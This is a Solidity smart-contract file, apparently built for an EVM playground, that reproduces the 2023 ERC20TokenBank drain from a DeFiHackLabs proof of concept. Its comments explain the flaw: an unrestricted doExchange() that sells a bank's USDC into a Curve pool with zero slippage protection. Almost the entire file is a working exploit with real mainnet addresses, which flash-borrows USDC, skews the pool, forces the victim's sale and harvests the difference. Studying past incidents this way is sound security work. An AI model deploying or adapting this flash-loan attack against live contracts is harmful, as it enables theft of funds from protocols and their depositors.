// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-ERC20TokenBank).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry `ContractTest`
// (attacker == address(this); the Uniswap V3 flash callback `uniswapV3FlashCallback`
// lives on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack (testExploit's
// body moved into `run()`, plus the flash callback) so the playground can deploy
// it and record run(). Logic and constants are copied verbatim from
// test/ERC20TokenBank_exp.sol.
//
// Root cause: ExchangeBetweenPools.doExchange() force-sells the ENTIRE balance of
// a partner bank into a Curve pool via exchange_underlying(1, 2, amount, 0) — the
// min_dy slippage bound is hard-coded to 0 and the function has no access control.
// The attacker skews the Curve pool first (flash-borrowed USDC dump), then calls
// doExchange() so the bank sells its 119,023.52 USDC into the poisoned pool for
// almost nothing, and finally reverses their own position to harvest the value
// the bank gave up.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IExchangeBetweenPools {
    function doExchange(uint256 amounts) external returns (bool);
}

interface IcurveYSwap {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract ERC20TokenBankDrain {
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    IExchangeBetweenPools constant ExchangeBetweenPools = IExchangeBetweenPools(0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D);
    IcurveYSwap constant curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IUniPairV3 constant Pair = IUniPairV3(0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168);
    uint256 constant victimAmount = 119_023_523_157;

    // testExploit(): approve both legs on the Curve pool, then flash-borrow 120,000
    // USDC from the Uniswap V3 pool. The callback below does the rest.
    function run() external {
        USDC.approve(address(curveYSwap), type(uint256).max);
        USDT.call(abi.encodeWithSignature("approve(address,uint256)", address(curveYSwap), type(uint256).max));
        Pair.flash(address(this), 0, 120_000 * 1e6, new bytes(1));
    }

    function uniswapV3FlashCallback(uint256, uint256 amount1, bytes calldata) external {
        // Step 1: skew the Curve pool by dumping the borrowed 120,000 USDC → USDT.
        curveYSwap.exchange_underlying(1, 2, 120_000 * 1e6, 0);

        // Step 2: trigger the victim — it force-sells its full 119,023.52 USDC into
        // the now-poisoned pool at min_dy = 0.
        ExchangeBetweenPools.doExchange(victimAmount);

        // Step 3: reverse — swap the harvested USDT back to USDC at the skewed price.
        uint256 usdtBal = IERC20(USDT).balanceOf(address(this));
        curveYSwap.exchange_underlying(2, 1, usdtBal, 0);

        // Step 4: repay the flash loan (principal + fee).
        USDC.transfer(address(Pair), 120_000 * 1e6 + amount1);
    }
}
